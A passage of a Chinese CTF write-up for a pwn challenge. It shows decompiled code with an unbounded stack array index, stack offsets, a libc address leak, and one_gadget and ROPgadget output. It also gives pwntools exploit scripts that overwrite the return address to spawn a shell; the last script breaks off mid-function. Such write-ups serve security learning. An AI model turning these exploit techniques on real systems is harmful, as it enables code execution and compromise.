class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> choice; <span class=\"comment\">// [rsp+4h] [rbp-41Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+8h] [rbp-418h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> num_to_write; <span class=\"comment\">// [rsp+Ch] [rbp-414h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> nums[<span class=\"number\">256</span>]; <span class=\"comment\">// [rsp+10h] [rbp-410h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v8; <span class=\"comment\">// [rsp+418h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  init();</span><br><span class=\"line\">  menu();</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(nums, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(nums));</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)__isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;choice) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( choice == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Idx:&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)__isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;idx) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The num: %u\\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)nums[idx]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( choice != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Idx:&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)__isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;idx) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Num:&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)__isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;num_to_write) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      nums[idx] = num_to_write;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Byebye!&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t能够看到,它实现了读写栈上的一个数组的功能,但是没有设置边界,于是可以读写栈上的任意值,那可以直接修改返回地址,但是没有后门函数,(<font color=\"red\">于是自己就先用rop链写system(“&#x2F;bin&#x2F;sh”),失败后又用了orw…越做越麻烦,其实可以直接用one_gadget的!</font>)</p>\n<h2 id=\"寻找返回地址和gadget\"><a href=\"#寻找返回地址和gadget\" class=\"headerlink\" title=\"寻找返回地址和gadget\"></a>寻找返回地址和gadget</h2><p> int nums[256]; &#x2F;&#x2F; [rsp+10h] [rbp-410h] BYREF</p>\n<p>现在明白在ida里面这个注释是什么意思了…就是从rsp+0x10的位置开始读nums,或者rbp-0x410的位置,这俩等价</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-0000000000000410</span> nums            dd <span class=\"number\">256</span> dup(?)</span><br><span class=\"line\"><span class=\"number\">-0000000000000010</span>                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000F</span>                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000</span>E                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000</span>D                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000</span>C                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000B</span>                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-000000000000000</span>A                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-0000000000000009</span>                 db ? ; undefined</span><br><span class=\"line\"><span class=\"number\">-0000000000000008</span> var_8           dq ?</span><br><span class=\"line\">+<span class=\"number\">0000000000000000</span>  s              db <span class=\"number\">8</span> dup(?)</span><br><span class=\"line\">+<span class=\"number\">0000000000000008</span>  r              db <span class=\"number\">8</span> dup(?)</span><br><span class=\"line\">+<span class=\"number\">0000000000000010</span></span><br><span class=\"line\">+<span class=\"number\">0000000000000010</span> ; end of <span class=\"built_in\">stack</span> variables</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tnum占了256个4字节的空间,总共0x400, 然后还有8字节不知道干啥的,剩下8字节是canary? 然后就是rbp和返回地址了</p>\n<p>开启了pie,下断点的时候先vmmap看一下基址,然后+ida里面的地址</p>\n<p>​\t\t调试试试一下,所以打印258 259是canry,(注意num从0开始计数),260 261是rbp  262 263是返回地址</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522122710222.png\" alt=\"image-20230522122710222\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">262</span> <span class=\"number\">0xf7deb083</span></span><br><span class=\"line\"><span class=\"number\">263</span> <span class=\"number\">0x7fff</span>     返回地址, 同时也是lib_start_main+<span class=\"number\">243</span>地址,即可以算出glibc的地址</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">270</span> <span class=\"number\">0x55554942</span></span><br><span class=\"line\"><span class=\"number\">271</span> <span class=\"number\">0x5555</span>  main的地址</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t把rsp修改成&#x2F;bin&#x2F;sh,然后返回地址 pop rdi, 然后system,就行了把(错了错了! ,rop的基本流程都忘了,在rop的时候rsp已经到了最后的rbp那个位置了….改上面干啥…)</p>\n<h2 id=\"泄露基地址\"><a href=\"#泄露基地址\" class=\"headerlink\" title=\"泄露基地址\"></a>泄露基地址</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">262</span> <span class=\"number\">0xf7deb083</span></span><br><span class=\"line\"><span class=\"number\">263</span> <span class=\"number\">0x7fff</span>     返回地址, 同时也是lib_start_main+<span class=\"number\">243</span>地址,即可以算出glibc的地址</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t泄漏的地址和libc加载的地址相差是固定的,可以从ida里看,也可以调试的时候看一下,调试的时候,打印出来它的值,减去加载的地址,就得到了固定的偏移</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522153504249.png\" alt=\"image-20230522153504249\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readone(<span class=\"number\">262</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">addr1 = io.recv(<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">readone(<span class=\"number\">263</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;The num: &quot;</span>)</span><br><span class=\"line\">addr2 = io.recv(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(<span class=\"built_in\">int</span>(addr1)))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(<span class=\"built_in\">int</span>(addr2)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#libcbase = int(addr1) - 0x240b3</span></span><br><span class=\"line\"><span class=\"comment\">## 拼接</span></span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = <span class=\"built_in\">int</span>(addr2)*(<span class=\"number\">2</span>**<span class=\"number\">32</span>)+<span class=\"built_in\">int</span>(addr1) - <span class=\"number\">0x240b3</span></span><br><span class=\"line\">libcbase1 = <span class=\"built_in\">int</span>(addr2)*(<span class=\"number\">0b100000000000000000000000000000000</span>)+<span class=\"built_in\">int</span>(addr1) - <span class=\"number\">0x240b3</span></span><br><span class=\"line\">libcbase2 = (<span class=\"built_in\">int</span>(addr2)&lt;&lt;<span class=\"number\">32</span>) + <span class=\"built_in\">int</span>(addr1) - <span class=\"number\">0x240b3</span> <span class=\"comment\"># 注意&lt;&lt;优先级很低,加个括号</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\tio接收到的是byte流 比如b’3033882803’,并且一次是不能打印完全的,只是4字节,要两次的拼起来</p>\n<p>​\t\tint(add2)*(2**32) 这样,或者左移32位才对,当时做题的时候好像是直接乘了100000…. 内存爆了还是溢出,报错了,应该是二进制的1000(32个0)</p>\n<p>​\t\t</p>\n<h2 id=\"封装函数-实现快速数据操作\"><a href=\"#封装函数-实现快速数据操作\" class=\"headerlink\" title=\"封装函数,实现快速数据操作\"></a>封装函数,实现快速数据操作</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read1</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    low_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>) <span class=\"comment\"># 这样就可以接收到全部了,不用考虑长度,到\\n截止,10进制接收</span></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    high_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> high_addr*(<span class=\"number\">2</span>**<span class=\"number\">32</span>)+low_addr</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase3 = read1(<span class=\"number\">262</span>) - <span class=\"number\">0x240b3</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libcbase3))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write1</span>(<span class=\"params\">index,num</span>):</span><br><span class=\"line\">    high_num = <span class=\"built_in\">int</span>(num/(<span class=\"number\">2</span>**<span class=\"number\">32</span>))</span><br><span class=\"line\">    low_num  = num%(<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(low_num))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(high_num))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"one-gadget解法\"><a href=\"#one-gadget解法\" class=\"headerlink\" title=\"one_gadget解法\"></a>one_gadget解法</h2><p>​\t\t题目有给libc版本,但是感觉好像不对啊… 给的是2.27,其实是2.31-0ubuntu9.7_amd64</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/yuesai/easyleak# one_gadget /root/pwn/glibc-all-in-one/libs/<span class=\"number\">2.31</span><span class=\"number\">-0u</span>buntu9<span class=\"number\">.7</span>_amd64/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\"><span class=\"number\">0xe3b2e</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [r15] == <span class=\"literal\">NULL</span> || r15 == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [r12] == <span class=\"literal\">NULL</span> || r12 == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xe3b31</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [r15] == <span class=\"literal\">NULL</span> || r15 == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [rdx] == <span class=\"literal\">NULL</span> || rdx == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xe3b34</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsi] == <span class=\"literal\">NULL</span> || rsi == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [rdx] == <span class=\"literal\">NULL</span> || rdx == <span class=\"literal\">NULL</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read1</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    low_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>) <span class=\"comment\"># 这样就可以接收到全部了,不用考虑长度,到\\n截止,10进制接收</span></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    high_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> high_addr*(<span class=\"number\">2</span>**<span class=\"number\">32</span>)+low_addr</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write1</span>(<span class=\"params\">index,num</span>):</span><br><span class=\"line\">    high_num = <span class=\"built_in\">int</span>(num/(<span class=\"number\">2</span>**<span class=\"number\">32</span>))</span><br><span class=\"line\">    low_num  = num%(<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(low_num))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Num:&quot;</span>,<span class=\"built_in\">str</span>(high_num))</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = read1(<span class=\"number\">262</span>) - <span class=\"number\">0x240b3</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(libcbase3))</span></span><br><span class=\"line\"></span><br><span class=\"line\">onegadget = libcbase + <span class=\"number\">0xe3b31</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">write1(<span class=\"number\">262</span>,onegadget)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t<font color=\"red\">不对不对..其实不是这个libc版本,所以onegadget是瞎猫碰死耗子,撞上了….(或者说他前面的指令不影响后续getshell)</font></p>\n<h2 id=\"system解法\"><a href=\"#system解法\" class=\"headerlink\" title=\"system解法\"></a>system解法</h2><p>找到&#x2F;bin&#x2F;sh和system 以及gadget</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary libc.so<span class=\"number\">.6</span> --only <span class=\"string\">&#x27;pop|ret&#x27;</span> | grep <span class=\"string\">&#x27;rdi&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x00000000000248f2</span> : pop rdi ; pop rbp ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000023b6a</span> : pop rdi ; ret</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">ROPgadget --binary libc.so<span class=\"number\">.6</span>  --<span class=\"built_in\">string</span> <span class=\"string\">&#x27;/bin/sh&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x00000000001b45bd</span> : /bin/sh</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">ROPgadget --binary libc.so<span class=\"number\">.6</span> --only <span class=\"string\">&#x27;ret&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000022679</span> : ret</span><br><span class=\"line\">    </span><br><span class=\"line\">system = libcbase + mylibc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read1</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    low_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>) <span class=\"comment\"># 这样就可以接收到全部了,不用考虑长度,到\\n截止,10进制接收</span></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Idx:&quot;</span>,<span class=\"built_in\">str</span>(index+<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">    high_addr=<span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> high_addr*(<span class=\"number\">2</span>**<span class=\"number\">32</span>)+low_addr</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write1</span>(<span class=\"params\">index,num</span>):</span><br><span class=\"line\">    high_num = <span class=\"built_in\">int</span>(num/(<span class=\"number\">2</span>**<span class=\"number\">32</span>))</span><br><span class=\"line\">    low_num  = num%(<span class=\"number\">2</span>**<span class=\"number\">32</span>)</span><br><span class=\"line\">    